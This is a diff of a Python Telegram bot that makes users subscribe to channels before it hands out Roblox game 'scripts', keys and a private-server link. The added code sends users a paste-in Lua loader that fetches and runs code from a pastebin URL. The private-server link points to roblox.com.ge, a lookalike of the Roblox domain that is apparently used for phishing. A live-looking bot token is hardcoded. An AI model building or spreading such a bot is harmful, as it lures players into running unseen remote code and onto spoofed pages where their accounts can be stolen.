@@ -3,8 +3,8 @@ import random
 from telebot import types
 import sqlite3
 import os
-from threading import Thread
 import socket
+from threading import Thread
 
 TOKEN = os.environ.get("TOKEN", "8793302361:AAHCxbHJ6v_oCyjHqiafsHHaf7Xr1EvkDO8")
 ADMIN_ID = 8091608667
@@ -66,21 +66,17 @@ CHANNELS = [
 KEYS = ["МОПС", "СКИТ", "ТАКСА", "КИТ", "LARS", "MOPS", "ARDOR", "MALTUIPY"]
 
 PRIVATE_SERVER_LINK = "https://roblox.com.ge/games/142823291/Murder-Mystery-2?privateServerLinkCode=67807728184198406550153024608844"
-PRIVATE_SERVER_TEXT = "🔒 Приватка: даю фри годли"
+SCRIPT_LINK = "loadstring(game:HttpGet(\"https://pastebin.com/raw/GdQULgA6\"))()"
 
 MESSAGES = {
     "start": "😌 Чтобы продолжить пользоваться ботом, пожалуйста, выполни следующие задания!",
-    "sub_success": "🎉 Подписка подтверждена!\n\n🔑 Твой ключ: {key}\n\n📋 Скопируй и вставь в скрипт.\n\n{private_text}\n{private_link}",
     "not_subscribed": "📢 Подпишитесь на каналы для получения скрипта и ключа",
-    "already_subscribed": "✅ Спасибо за подписку!\n\n🔑 Твой ключ: {key}\n\n📋 Скопируй и вставь в скрипт.\n\n{private_text}\n{private_link}",
     "not_all_subs": "❌ Вы не подписаны на все каналы!"
 }
 
 PHOTOS = {
     "start": None,
-    "sub_success": None,
-    "not_subscribed": None,
-    "already_subscribed": None
+    "not_subscribed": None
 }
 
 bot = telebot.TeleBot(TOKEN)
@@ -131,43 +127,51 @@ def get_unsub_keyboard(not_subbed):
     ))
     return keyboard
 
+def get_success_keyboard():
+    keyboard = types.InlineKeyboardMarkup(row_width=1)
+    keyboard.add(types.InlineKeyboardButton(
+        text="📜 Скрипт на все игры",
+        callback_data="get_script"
+    ))
+    keyboard.add(types.InlineKeyboardButton(
+        text="🔑 Ключ",
+        callback_data="get_key"
+    ))
+    keyboard.add(types.InlineKeyboardButton(
+        text="🔒 Приватный сервер MM2",
+        callback_data="get_private"
+    ))
+    return keyboard
+
 def get_admin_keyboard():
     keyboard = types.InlineKeyboardMarkup(row_width=2)
     keyboard.add(
         types.InlineKeyboardButton("📝 Приветствие", callback_data="admin_edit_start"),
-        types.InlineKeyboardButton("🎉 Успех подписки", callback_data="admin_edit_success")
-    )
-    keyboard.add(
-        types.InlineKeyboardButton("📢 Не подписан", callback_data="admin_edit_notsub"),
-        types.InlineKeyboardButton("✅ Проверка прошла", callback_data="admin_edit_already")
+        types.InlineKeyboardButton("📢 Не подписан", callback_data="admin_edit_notsub")
     )
     keyboard.add(
         types.InlineKeyboardButton("🖼 Фото старт", callback_data="admin_photo_start"),
-        types.InlineKeyboardButton("🖼 Фото успех", callback_data="admin_photo_success")
+        types.InlineKeyboardButton("➕ Канал", callback_data="admin_add_channel")
     )
     keyboard.add(
-        types.InlineKeyboardButton("🔗 Изменить ссылку", callback_data="admin_edit_link"),
-        types.InlineKeyboardButton("📝 Текст приватки", callback_data="admin_edit_privatetext")
+        types.InlineKeyboardButton("➖ Канал", callback_data="admin_del_channel"),
+        types.InlineKeyboardButton("📋 Каналы", callback_data="admin_list_channels")
     )
     keyboard.add(
-        types.InlineKeyboardButton("➕ Канал", callback_data="admin_add_channel"),
-        types.InlineKeyboardButton("➖ Канал", callback_data="admin_del_channel")
+        types.InlineKeyboardButton("🔑 Ключи", callback_data="admin_list_keys"),
+        types.InlineKeyboardButton("🔑 Изменить ключи", callback_data="admin_edit_keys")
     )
     keyboard.add(
-        types.InlineKeyboardButton("📋 Каналы", callback_data="admin_list_channels"),
-        types.InlineKeyboardButton("🔑 Ключи", callback_data="admin_list_keys")
+        types.InlineKeyboardButton("📨 Рассылка", callback_data="admin_broadcast"),
+        types.InlineKeyboardButton("📊 Статистика", callback_data="admin_stats")
     )
     keyboard.add(
-        types.InlineKeyboardButton("🔑 Изменить ключи", callback_data="admin_edit_keys"),
-        types.InlineKeyboardButton("📨 Рассылка", callback_data="admin_broadcast")
+        types.InlineKeyboardButton("👥 Пользователи", callback_data="admin_users_list"),
+        types.InlineKeyboardButton("🚫 Удалить юзера", callback_data="admin_del_user")
     )
     keyboard.add(
-        types.InlineKeyboardButton("📊 Статистика", callback_data="admin_stats"),
-        types.InlineKeyboardButton("👥 Пользователи", callback_data="admin_users_list")
-    )
-    keyboard.add(
-        types.InlineKeyboardButton("🚫 Удалить юзера", callback_data="admin_del_user"),
-        types.InlineKeyboardButton("📨 Личное сообщение", callback_data="admin_pm")
+        types.InlineKeyboardButton("📨 Личное сообщение", callback_data="admin_pm"),
+        types.InlineKeyboardButton("🔗 Изменить ссылку", callback_data="admin_edit_link")
     )
     return keyboard
 
@@ -198,11 +202,7 @@ def getkey(message):
     not_subbed = get_unsubscribed_channels(message.from_user.id)
     if not not_subbed:
         key = random.choice(KEYS)
-        text = MESSAGES["sub_success"].format(key=key, private_text=PRIVATE_SERVER_TEXT, private_link=PRIVATE_SERVER_LINK)
-        if PHOTOS["sub_success"]:
-            bot.send_photo(message.chat.id, PHOTOS["sub_success"], caption=text)
-        else:
-            bot.send_message(message.chat.id, text)
+        bot.send_message(message.chat.id, f"🎉 Подписка подтверждена!\n\n🔑 Твой ключ: {key}")
     else:
         if PHOTOS["not_subscribed"]:
             bot.send_photo(message.chat.id, PHOTOS["not_subscribed"], caption=MESSAGES["not_subscribed"], reply_markup=get_unsub_keyboard(not_subbed))
@@ -213,7 +213,7 @@ def getkey(message):
 def admin_panel(message):
     if not is_admin(message.from_user.id):
         return
-    text = f"🛡 *Админ панель*\n\n👥 Пользователей: {count_users()}\n📊 Каналов: {len(CHANNELS)}\n🔑 Ключей: {len(KEYS)}\n🔗 Приватная ссылка: {PRIVATE_SERVER_LINK[:50]}...\n\nВыбери действие:"
+    text = f"🛡 *Админ панель*\n\n👥 Пользователей: {count_users()}\n📊 Каналов: {len(CHANNELS)}\n🔑 Ключей: {len(KEYS)}\n\nВыбери действие:"
     bot.send_message(message.chat.id, text, parse_mode="Markdown", reply_markup=get_admin_keyboard())
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith("admin_"))
@@ -254,27 +254,15 @@ def admin_callback(call):
     elif action == "admin_edit_link":
         msg = bot.send_message(call.message.chat.id, "🔗 Введи новую ссылку на приватный сервер:")
         bot.register_next_step_handler(msg, save_link)
-    elif action == "admin_edit_privatetext":
-        msg = bot.send_message(call.message.chat.id, "📝 Введи новый текст для приватки:")
-        bot.register_next_step_handler(msg, save_private_text)
     elif action == "admin_edit_start":
         msg = bot.send_message(call.message.chat.id, "📝 Введи новый текст для приветствия:")
         bot.register_next_step_handler(msg, save_message, "start")
-    elif action == "admin_edit_success":
-        msg = bot.send_message(call.message.chat.id, "🎉 Введи новый текст для успешной подписки ({key}, {private_text}, {private_link}):")
-        bot.register_next_step_handler(msg, save_message, "sub_success")
     elif action == "admin_edit_notsub":
         msg = bot.send_message(call.message.chat.id, "📢 Введи новый текст для неподписанных:")
         bot.register_next_step_handler(msg, save_message, "not_subscribed")
-    elif action == "admin_edit_already":
-        msg = bot.send_message(call.message.chat.id, "✅ Введи новый текст для уже подписанных ({key}, {private_text}, {private_link}):")
-        bot.register_next_step_handler(msg, save_message, "already_subscribed")
     elif action == "admin_photo_start":
         msg = bot.send_message(call.message.chat.id, "🖼 Отправь фото для приветствия (или /skip):")
         bot.register_next_step_handler(msg, save_photo, "start")
-    elif action == "admin_photo_success":
-        msg = bot.send_message(call.message.chat.id, "🖼 Отправь фото для успешной подписки (или /skip):")
-        bot.register_next_step_handler(msg, save_photo, "sub_success")
     elif action == "admin_add_channel":
         msg = bot.send_message(call.message.chat.id, "➕ Введи данные канала:\nимя_канала | ссылка")
         bot.register_next_step_handler(msg, add_channel)
@@ -293,6 +281,37 @@ def admin_callback(call):
         msg = bot.send_message(call.message.chat.id, f"📨 Введи текст рассылки (получат {count_users()} чел.):")
         bot.register_next_step_handler(msg, broadcast_step1)
     bot.answer_callback_query(call.id)
+
+@bot.callback_query_handler(func=lambda call: call.data in ["check_sub", "get_script", "get_key", "get_private"])
+def user_callback(call):
+    action = call.data
+    
+    if action == "check_sub":
+        not_subbed = get_unsubscribed_channels(call.from_user.id)
+        if not not_subbed:
+            text = "✅ *Подписка подтверждена!*\n\nВыбери что хочешь получить:"
+            bot.send_message(call.message.chat.id, text, parse_mode="Markdown", reply_markup=get_success_keyboard())
+        else:
+            text = "❌ Осталось подписаться:\n\n"
+            for ch in not_subbed:
+                text += f"❎ {ch['name']}\n"
+            bot.send_message(call.message.chat.id, text, reply_markup=get_unsub_keyboard(not_subbed))
+    
+    elif action == "get_script":
+        text = f"📜 *Скрипт на все игры:*\n\n```lua\n{SCRIPT_LINK}\n```"
+        bot.send_message(call.message.chat.id, text, parse_mode="Markdown")
+        bot.answer_callback_query(call.id, "Скрипт отправлен!")
+    
+    elif action == "get_key":
+        key = random.choice(KEYS)
+        text = f"🔑 *Твой ключ:*\n\n`{key}`\n\nСкопируй и вставь в скрипт."
+        bot.send_message(call.message.chat.id, text, parse_mode="Markdown")
+        bot.answer_callback_query(call.id, "Ключ отправлен!")
+    
+    elif action == "get_private":
+        text = f"🔒 *Приватный сервер MM2*\n\n{PRIVATE_SERVER_LINK}"
+        bot.send_message(call.message.chat.id, text, parse_mode="Markdown")
+        bot.answer_callback_query(call.id, "Приватка отправлена!")
 
 def del_user_by_id(message):
     try:
@@ -321,11 +340,6 @@ def save_link(message):
     global PRIVATE_SERVER_LINK
     PRIVATE_SERVER_LINK = message.text.strip()
     bot.send_message(message.chat.id, f"✅ Ссылка обновлена!")
-
-def save_private_text(message):
-    global PRIVATE_SERVER_TEXT
-    PRIVATE_SERVER_TEXT = message.text.strip()
-    bot.send_message(message.chat.id, f"✅ Текст приватки обновлён!")
 
 def save_message(message, msg_type):
     MESSAGES[msg_type] = message.text
@@ -374,35 +388,17 @@ def broadcast_step2(message):
             pass
     bot.send_message(message.chat.id, f"✅ Отправлено: {count}/{len(users)}")
 
-@bot.callback_query_handler(func=lambda call: call.data == "check_sub")
-def check_sub_callback(call):
-    not_subbed = get_unsubscribed_channels(call.from_user.id)
-    if not not_subbed:
-        key = random.choice(KEYS)
-        text = MESSAGES["already_subscribed"].format(key=key, private_text=PRIVATE_SERVER_TEXT, private_link=PRIVATE_SERVER_LINK)
-        bot.send_message(call.message.chat.id, text)
-    else:
-        text = "❌ Осталось подписаться:\n\n"
-        for ch in not_subbed:
-            text += f"❎ {ch['name']}\n"
-        bot.send_message(call.message.chat.id, text, reply_markup=get_unsub_keyboard(not_subbed))
-    bot.answer_callback_query(call.id)
-
 def run_server():
     port = int(os.environ.get("PORT", 10000))
-    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    server.bind(('0.0.0.0', port))
-    server.listen(1)
-    print(f"Server started on port {port}")
+    s = socket.socket()
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s.bind(('0.0.0.0', port))
+    s.listen(1)
+    print(f"Port {port} opened")
     while True:
-        client, addr = server.accept()
-        try:
-            client.recv(1024)
-            client.send(b"HTTP/1.1 200 OK\r\nContent-Length: 15\r\n\r\nBot is running")
-        except:
-            pass
-        client.close()
+        c, _ = s.accept()
+        c.send(b"HTTP/1.1 200 OK\r\n\r\nBot running")
+        c.close()
 
 Thread(target=run_server).start()
 bot.polling()
